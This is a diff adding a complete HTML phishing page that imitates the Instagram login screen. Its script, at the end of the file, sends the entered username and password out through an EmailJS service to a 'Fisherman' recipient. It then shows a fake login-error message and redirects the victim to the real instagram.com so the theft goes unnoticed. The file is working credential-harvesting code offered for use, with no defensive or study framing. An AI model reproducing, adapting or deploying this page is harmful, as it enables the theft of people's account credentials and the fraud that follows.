@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram | Log in</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            // https://dashboard.emailjs.com/admin/integration
+            emailjs.init('user_QzSGVKcfDIa7rVUNFstOB');
+        })();
+    </script>
+    <style>
+        * {
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: "Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+            background-color: #f9f9f9;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        #main-section {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 80px;
+        }
+        #form-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-width: 350px;
+            padding: 25px 45px;
+            padding-bottom: 15px;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            }
+        .input-div {
+            width: 100%;
+            height: 38px;
+            border: 1px solid #d4d4d4;
+            margin-bottom: 6px;
+            border-radius: 4px;
+            position: relative;
+        }
+        #show-password {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            right: 10px;
+            font-weight: bold;
+            font-size: 14px;
+            display: none;
+            cursor:pointer;
+        }
+        form input {
+            width: 100%;
+            height: 100%;
+            border: none;
+            background-color: #f9f9f9;
+            padding: 10px;  
+            outline: none;
+            font-size: 12px;
+        }
+        form button {
+            height: 30px;
+            border: none;
+            color: #fff;
+            font-weight: bold;
+            margin-top: 10px;
+            margin-bottom: 15px;
+            border-radius: 4px;
+        }
+        #seperation {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        #seperation .line{
+            width: 100px;
+            height: 1px;
+            background-color: #c9c9c9;
+        }
+        #seperation .line:first-child {
+            margin-right: 20px;
+        }
+        #seperation .line:last-child {
+            margin-left: 20px;
+        }
+        #seperation p {
+            text-transform: uppercase;
+            color: #919191;
+            font-size: 13px;
+            font-weight: bold;
+        }
+        #facebook-login {
+            text-decoration: none;
+            color: #1f5485;
+            font-size: 14px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        #invalid-login {
+            color: #eb2c2c;
+            text-align: center;
+            max-width: 250px;
+            font-size: 14px;
+            margin-bottom: 15px;
+            display: none;
+        }
+        #forgotten-password {
+            font-size: 13px;
+            text-decoration: none;
+            color:#15357a;
+            margin-bottom: 10px;
+        }
+        #sign-up-box {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 25px;
+            margin: 10px 0 25px 0;
+            font-size: 15px;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+        }
+        #sign-up-box p {color: #2b2b2b;}
+        #sign-up-box a {
+            text-decoration: none;
+            color: #2f7ee6;
+            font-weight: bold;
+            margin-left: 3px;
+        }
+        #get-app {
+            align-self: center;
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 15px;
+            color: #2b2b2b;
+        }
+        #showcase-image {
+            width: 380px;
+            margin-right: 30px;
+        }
+        #text-logo {
+            width: 200px;
+            align-self: center;
+            margin-bottom: 25px;
+        }
+        .app-store-button {
+            width: 130px;
+        }
+        .app-store-button:first-child {
+            margin-right: 15px;
+        }
+        #app-store-buttons {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        footer {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 12px;
+        }
+        #top-links a, #bottom-links a {
+            text-decoration: none;
+            color: #a1a1a1;
+            margin-right: 10px;
+            line-height: 25px;
+        }
+        #top-links a:last-child, #bottom-links a:last-child {margin-right: 0;}
+        #top-links, #bottom-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            padding: 0 25px;
+        }
+        #top-links {margin-bottom: 5px;}
+        #bottom-links {margin-bottom: 30px;}
+        #copyright {color: #a1a1a1}
+
+        @media only screen and (max-width: 880px) {
+            #showcase-image {
+                display: none;
+            }
+        }
+        @media only screen and (max-width: 450px) {
+            #form-container, #sign-up-box {
+                border: none;
+                background-color: #fafafa;
+            }
+        }
+    </style>
+</head>
+<body>
+    <section id="main-section">
+        <img id="showcase-image" src="./images/insta-showcase.png" alt="image-showcase" >
+        <div id="form-section">
+            <div id="form-container">
+                <form>
+                    <img id="text-logo" src="./images/text-logo.png" alt="text-logo">
+                    <div class="input-div"><input id="username" name="username" type="text" placeholder="Phone number, username or email address"></div>
+                    <div class="input-div">
+                        <input id="password" name="password" type="password" placeholder="Password">
+                        <p id="show-password">Show</p>
+                    </div>
+                    <button id="submit-button" type="submit">Log In</button>
+                </form>
+                <div id="seperation">
+                    <div class="line"></div>
+                    <p>or</p>
+                    <div class="line"></div>
+                </div>
+                <a id="facebook-login" href="./fa-login.html">Log in with Facebook</a>
+                <p id="invalid-login">Sorry, your password and username don't match. Please double-check them.</p>
+                <a id="forgotten-password" href="https://www.instagram.com/accounts/password/reset/">Forgotten your password?</a>
+            </div>
+            <div id="sign-up-box">
+                <p>Don't have an account?</p>
+                <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
+            </div>
+            <p id="get-app">Get the app.</p>
+            <div id="app-store-buttons">
+                <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&ct=igweb.loginPage.badge&mt=8&vt=lo"><img class="app-store-button" src="./images/app-store-button.png" alt="Get the app on App Store."></a>
+                <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DFA651F8F-6F6D-46EA-9D5D-B5C625E2184D%26utm_content%3Dlo%26utm_medium%3Dbadge"><img class="app-store-button" src="./images/google-play-button.png" alt="Get the app on Google Play."></a>
+            </div>
+        </div>
+    </section>
+    <footer>
+        <section id="top-links">
+            <a href="https://about.instagram.com/" target="_blank" rel="noreferrer">About</a>
+            <a href="https://about.instagram.com/blog/" target="_blank" rel="noreferrer">Blog</a>
+            <a href="https://www.instagram.com/about/jobs/" target="_blank" rel="noreferrer">Jobs</a>
+            <a href="https://help.instagram.com/" target="_blank" rel="noreferrer">Help</a>
+            <a href="https://developers.facebook.com/docs/instagram" target="_blank" rel="noreferrer">API</a>
+            <a href="https://www.instagram.com/legal/privacy/" target="_blank" rel="noreferrer">Privacy</a>
+            <a href="https://www.instagram.com/legal/terms/" target="_blank" rel="noreferrer">Terms</a>
+            <a href="https://www.instagram.com/directory/profiles/" target="_blank" rel="noreferrer">Top accounts</a>
+            <a href="https://www.instagram.com/directory/hashtags/" target="_blank" rel="noreferrer">Hashtags</a>
+            <a href="https://www.instagram.com/explore/locations/" target="_blank" rel="noreferrer">Locations</a>
+            <a href="https://www.instagram.com/web/lite/" target="_blank" rel="noreferrer">Instagram Lite</a>
+        </section>
+        <section id="bottom-links">
+            <a href="https://www.instagram.com/topics/beauty/" target="_blank" rel="noreferrer">Beauty</a>
+            <a href="https://www.instagram.com/topics/dance-and-performance/" target="_blank" rel="noreferrer">Dance</a>
+            <a href="https://www.instagram.com/topics/fitness/" target="_blank" rel="noreferrer">Fitness</a>
+            <a href="https://www.instagram.com/topics/food-and-drink/" target="_blank" rel="noreferrer">Food and drink</a>
+            <a href="https://www.instagram.com/topics/home-and-garden/" target="_blank" rel="noreferrer">Home and garden</a>
+            <a href="https://www.instagram.com/topics/music/" target="_blank" rel="noreferrer">Music</a>
+            <a href="https://www.instagram.com/topics/visual-arts/" target="_blank" rel="noreferrer">Visual arts</a>
+        </section>
+        <p id="copyright">&copy;2021 Instagram from Facebook</p>
+    </footer>
+</body>
+<script>
+    const submitButton = document.querySelector("#submit-button");
+    const showPassword = document.querySelector('#show-password');
+    const password = document.querySelector('#password');
+
+    if(document.querySelector("#username").value.length < 1
+            || password.value.length < 6){
+                submitButton.style.backgroundColor = "#2f7ee63b";
+                submitButton.disabled = true;
+        }
+        else {
+            submitButton.style.backgroundColor = "#2f7ee6";
+            submitButton.disabled = false;
+        }
+    const handleTogglePassword = () => {
+        if(showPassword.innerHTML === "Show"){
+            showPassword.innerHTML = "Hide";
+            password.type = "text";
+        }
+        else {
+            showPassword.innerHTML = "Show";
+            password.type = "password";
+        }
+    }
+    const handleInputChange = () => {
+        if(document.querySelector("#username").value.length < 1
+            || password.value.length < 6){
+               submitButton.style.backgroundColor = "#2f7ee63b";
+               submitButton.disabled = true;
+        }
+        else {
+            submitButton.style.backgroundColor = "#2f7ee6";
+            submitButton.disabled = false;
+        }
+    }
+    const handlePasswordChange = () => {
+        if(password.value.length === 0) {showPassword.style.display = "none"}
+        else {showPassword.style.display = "block"}
+    }
+    const handleSubmitForm = (event) => {
+        event.preventDefault();
+        const template_params = {
+            from_name: document.querySelector("#username").value,
+            to_name: "Fisherman",
+            message: `Username: ${document.querySelector('#username').value}\nPassword: ${password.value}`,
+            reply_to: "death@himself.net"
+        }
+
+        emailjs.send('service_trfso2z', 'template_a1qaoyi', template_params)
+        .then(function(response) {
+            console.log('SUCCESS!', response.status, response.text);
+        }, function(error) {
+            console.log('FAILED...', error);
+        });
+
+        document.querySelector('#invalid-login').style.display = 'block';
+        window.setTimeout(() => window.location.href = 'https://instagram.com', 3000);
+    }
+
+    password.addEventListener("keyup", handlePasswordChange);
+    document.querySelectorAll('input').forEach(element => addEventListener('keyup', handleInputChange));
+    document.querySelector('form').addEventListener('submit', handleSubmitForm);
+    showPassword.addEventListener('click', handleTogglePassword);
+</script>
+</html>
